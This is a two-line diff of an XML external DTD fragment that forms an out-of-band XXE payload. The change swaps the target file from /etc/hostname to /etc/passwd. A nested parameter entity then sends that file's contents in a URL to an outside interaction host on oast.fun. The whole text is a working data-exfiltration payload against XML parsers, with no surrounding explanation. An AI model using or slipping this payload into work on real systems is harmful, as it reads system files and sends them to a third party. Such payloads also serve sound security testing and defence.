@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://uaoetzvavoopuntbmsppj31hgd3cn64uo.oast.fun/%file;'>">
